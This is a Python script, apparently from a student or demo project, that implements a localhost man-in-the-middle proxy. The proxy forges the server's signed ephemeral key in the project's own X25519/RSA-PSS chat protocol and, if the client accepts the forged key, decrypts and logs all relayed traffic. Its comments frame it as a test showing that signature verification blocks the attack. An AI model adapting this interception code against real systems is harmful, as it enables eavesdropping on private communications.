import asyncio
import base64
import os
import sys
from dataclasses import dataclass, field

_ATTACKS_DIR = os.path.dirname(os.path.abspath(__file__))
_SRC_DIR = os.path.dirname(_ATTACKS_DIR)
sys.path.insert(0, _SRC_DIR)

from cryptography.hazmat.primitives.asymmetric.rsa import generate_private_key

from crypto_transport import (
    decrypt_counter_aead,
    derive_server_session_keys,
    encrypt_counter_aead,
    generate_eph,
    ratchet_key,
    rsa_sign,
    x25519_pub_from_b64,
)
from protocol import Msg

# =============================================================================
# MITM Proxy — Attack: Full Transport Key-Exchange Interception
#
# Sits between client (port 9999) and server (port 8888).
#
# Phase 1 — Handshake interception:
#   1. Receives SERVER_EPH from real server (X25519 pub + RSA-PSS sig)
#   2. Generates own X25519 ephemeral keys (one per direction)
#   3. Derives MITM↔Server session keys via DH with server's real eph key
#   4. Sends FAKE SERVER_EPH to client (signed with attacker's RSA key)
#   5. Waits for CLIENT_EPH; derives MITM↔Client session keys via DH
#
# Phase 2 — Relay (only if client accepted the fake key):
#   - Decrypts every ENC frame, logs plaintext, re-encrypts for other side
#   - Applies symmetric ratchet per message (mirrors server/client logic)
#
# Expected result: client verifies SERVER_EPH sig against server_public.pem
#   → signature mismatch → "[ERROR] Server authentication failed — possible MITM!"
#   → CLIENT_EPH never sent → MITM detects abort → attack blocked.
#
# What this demonstrates: without RSA-PSS signature verification on the
# server's ephemeral key, MITM would silently decrypt ALL ENC traffic.
# =============================================================================

LISTEN_HOST = "127.0.0.1"
LISTEN_PORT = 9999
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 8888

# Attacker RSA key generated once at startup.
# Client will reject signatures made with this key because it doesn't
# match the server_public.pem distributed at install time.
print("[MITM] Generating attacker RSA-2048 keypair...", flush=True)
_ATTACKER_RSA = generate_private_key(public_exponent=65537, key_size=2048)
print("[MITM] Attacker RSA key ready.", flush=True)


@dataclass
class MITMSession:
    # Client↔MITM channel — MITM acts as server toward the client
    c_c2s_key: bytes = field(default=b"")   # decrypt ENC from client
    c_s2c_key: bytes = field(default=b"")   # encrypt ENC to client
    c_recv_ctr: int = 0                      # last counter received from client
    c_send_ctr: int = 0                      # counter for messages sent to client

    # MITM↔Server channel — MITM acts as client toward the server
    s_c2s_key: bytes = field(default=b"")   # encrypt ENC to server
    s_s2c_key: bytes = field(default=b"")   # decrypt ENC from server
    s_recv_ctr: int = 0                      # last counter received from server
    s_send_ctr: int = 0                      # counter for messages sent to server


async def handle_client(client_reader: asyncio.StreamReader,
                        client_writer: asyncio.StreamWriter):
    addr = client_writer.get_extra_info("peername")
    print(f"\n[MITM] ══ New connection from {addr} ══", flush=True)

    try:
        server_reader, server_writer = await asyncio.open_connection(
            SERVER_HOST, SERVER_PORT
        )
    except ConnectionRefusedError:
        print("[MITM] Cannot connect to real server — is it running?", flush=True)
        client_writer.close()
        return

    # ── Phase 1: Intercept server→client handshake ────────────────────────
    try:
        line = await asyncio.wait_for(server_reader.readline(), timeout=10.0)
    except asyncio.TimeoutError:
        print("[MITM] Timeout waiting for SERVER_EPH.", flush=True)
        client_writer.close()
        server_writer.close()
        return

    text = line.decode().strip()
    msg_type, _, payload = text.partition(":")

    if msg_type != Msg.SERVER_EPH:
        print(f"[MITM] Unexpected message from server: {msg_type!r}", flush=True)
        client_writer.close()
        server_writer.close()
        return

    # Parse real server's ephemeral public key (and discard the real signature)
    real_eph_pub_b64, _real_sig = payload.split(".", 1)
    print(f"[MITM] Intercepted SERVER_EPH  real_eph={real_eph_pub_b64[:20]}...", flush=True)

    # Generate two attacker ephemeral keys:
    #   fake_srv_eph  — MITM presents to client as "server"
    #   fake_cli_eph  — MITM presents to server as "client"
    fake_srv_eph_priv, fake_srv_eph_pub_b64 = generate_eph()
    fake_cli_eph_priv, fake_cli_eph_pub_b64 = generate_eph()

    # Derive MITM↔Server session keys: DH(fake_cli_eph_priv, real_server_eph_pub)
    real_server_eph_pub = x25519_pub_from_b64(real_eph_pub_b64)
    shared_with_server = fake_cli_eph_priv.exchange(real_server_eph_pub)
    s_c2s, s_s2c = derive_server_session_keys(shared_with_server)
    print(f"[MITM] ✓ MITM↔Server DH done  shared={shared_with_server.hex()[:16]}...", flush=True)

    # Send fake CLIENT_EPH to real server so server derives matching keys
    server_writer.write(f"{Msg.CLIENT_EPH}:{fake_cli_eph_pub_b64}\n".encode())
    await server_writer.drain()
    print(f"[MITM] Sent fake CLIENT_EPH to server  fake_cli_eph={fake_cli_eph_pub_b64[:20]}...", flush=True)

    # Sign the fake server eph with the attacker's RSA key
    fake_sig_b64 = rsa_sign(_ATTACKER_RSA, base64.b64decode(fake_srv_eph_pub_b64))

    # Send fake SERVER_EPH to client
    fake_server_eph_msg = f"{Msg.SERVER_EPH}:{fake_srv_eph_pub_b64}.{fake_sig_b64}\n"
    client_writer.write(fake_server_eph_msg.encode())
    await client_writer.drain()
    print(f"[MITM] Sent fake SERVER_EPH to client  fake_srv_eph={fake_srv_eph_pub_b64[:20]}...", flush=True)
    print(f"[MITM] *** Client will verify sig against server_public.pem → MISMATCH EXPECTED ***", flush=True)

    # ── Wait for CLIENT_EPH — only arrives if client accepted the fake key ─
    try:
        line = await asyncio.wait_for(client_reader.readline(), timeout=5.0)
    except asyncio.TimeoutError:
        print(f"[MITM] ✗ No CLIENT_EPH received (timeout).", flush=True)
        print(f"[MITM] → Client rejected fake SERVER_EPH. RSA-PSS verification BLOCKED the attack.", flush=True)
        client_writer.close()
        server_writer.close()
        return

    if not line:
        print(f"[MITM] ✗ Client closed connection immediately.", flush=True)
        print(f"[MITM] → RSA-PSS verification BLOCKED the attack.", flush=True)
        client_writer.close()
        server_writer.close()
        return

    text = line.decode().strip()
    msg_type, _, client_eph_pub_b64 = text.partition(":")

    if msg_type != Msg.CLIENT_EPH:
        print(f"[MITM] ✗ Expected CLIENT_EPH, got {msg_type!r} — client aborted.", flush=True)
        print(f"[MITM] → RSA-PSS verification BLOCKED the attack.", flush=True)
        client_writer.close()
        server_writer.close()
        return

    # Client accepted the fake key (would only happen if verification was bypassed)
    print(f"[MITM] CLIENT_EPH received  client_eph={client_eph_pub_b64[:20]}...", flush=True)

    # Derive MITM↔Client session keys: DH(fake_srv_eph_priv, client_eph_pub)
    client_eph_pub = x25519_pub_from_b64(client_eph_pub_b64)
    shared_with_client = fake_srv_eph_priv.exchange(client_eph_pub)
    c_c2s, c_s2c = derive_server_session_keys(shared_with_client)
    print(f"[MITM] ✓ MITM↔Client DH done  shared={shared_with_client.hex()[:16]}...", flush=True)
    print(f"[MITM] *** BOTH SESSION KEYS COMPROMISED — decrypting all ENC traffic ***", flush=True)

    session = MITMSession(
        c_c2s_key=c_c2s, c_s2c_key=c_s2c,
        s_c2s_key=s_c2s, s_s2c_key=s_s2c,
    )

    # ── Phase 2: Relay with full decrypt/log/re-encrypt ───────────────────
    await asyncio.gather(
        _relay_c2s(client_reader, server_writer, session),
        _relay_s2c(server_reader, client_writer, session),
    )

    print(f"[MITM] ══ Connection from {addr} closed ══", flush=True)


async def _relay_c2s(client_reader: asyncio.StreamReader,
                     server_writer: asyncio.StreamWriter,
                     session: MITMSession):
    """Client → MITM → Server: decrypt with MITM↔Client key, re-encrypt with MITM↔Server key."""
    try:
        async for line_bytes in client_reader:
            text = line_bytes.decode().strip()
            msg_type, _, payload = text.partition(":")

            if msg_type == Msg.ENC:
                plaintext, counter = decrypt_counter_aead(
                    session.c_c2s_key, payload, session.c_recv_ctr
                )
                if plaintext is not None:
                    session.c_recv_ctr = counter
                    session.c_c2s_key = ratchet_key(session.c_c2s_key)
                    print(f"[MITM C→S] DECRYPTED: {plaintext[:120]}", flush=True)
                    # Re-encrypt for server using MITM↔Server c2s key
                    session.s_send_ctr += 1
                    new_payload = encrypt_counter_aead(
                        session.s_c2s_key, plaintext, session.s_send_ctr
                    )
                    session.s_c2s_key = ratchet_key(session.s_c2s_key)
                    server_writer.write(f"{Msg.ENC}:{new_payload}\n".encode())
                else:
                    print(f"[MITM C→S] Decrypt failed — forwarding raw", flush=True)
                    server_writer.write(line_bytes)
            else:
                print(f"[MITM C→S] RAW: {text[:100]}", flush=True)
                server_writer.write(line_bytes)

            await server_writer.drain()
    except (asyncio.IncompleteReadError, ConnectionResetError):
        pass
    finally:
        server_writer.close()


async def _relay_s2c(server_reader: asyncio.StreamReader,
                     client_writer: asyncio.StreamWriter,
                     session: MITMSession):
    """Server → MITM → Client: decrypt with MITM↔Server key, re-encrypt with MITM↔Client key."""
    try:
        async for line_bytes in server_reader:
            text = line_bytes.decode().strip()
            msg_type, _, payload = text.partition(":")

            if msg_type == Msg.ENC:
                plaintext, counter = decrypt_counter_aead(
                    session.s_s2c_key, payload, session.s_recv_ctr
                )
                if plaintext is not None:
                    session.s_recv_ctr = counter
                    session.s_s2c_key = ratchet_key(session.s_s2c_key)
                    print(f"[MITM S→C] DECRYPTED: {plaintext[:120]}", flush=True)
                    # Re-encrypt for client using MITM↔Client s2c key
                    session.c_send_ctr += 1
                    new_payload = encrypt_counter_aead(
                        session.c_s2c_key, plaintext, session.c_send_ctr
                    )
                    session.c_s2c_key = ratchet_key(session.c_s2c_key)
                    client_writer.write(f"{Msg.ENC}:{new_payload}\n".encode())
                else:
                    print(f"[MITM S→C] Decrypt failed — forwarding raw", flush=True)
                    client_writer.write(line_bytes)
            else:
                print(f"[MITM S→C] RAW: {text[:100]}", flush=True)
                client_writer.write(line_bytes)

            await client_writer.drain()
    except (asyncio.IncompleteReadError, ConnectionResetError):
        pass
    finally:
        client_writer.close()


async def main():
    server = await asyncio.start_server(handle_client, LISTEN_HOST, LISTEN_PORT)
    print(f"[MITM] Proxy listening on {LISTEN_HOST}:{LISTEN_PORT}")
    print(f"[MITM] Forwarding to {SERVER_HOST}:{SERVER_PORT}")
    print(f"[MITM] Attack: Full transport key-exchange interception")
    print(f"[MITM] ─────────────────────────────────────────────────")
    print(f"[MITM] Connect client with:  python client.py {LISTEN_PORT}")
    print()
    async with server:
        await server.serve_forever()


if __name__ == "__main__":
    asyncio.run(main())
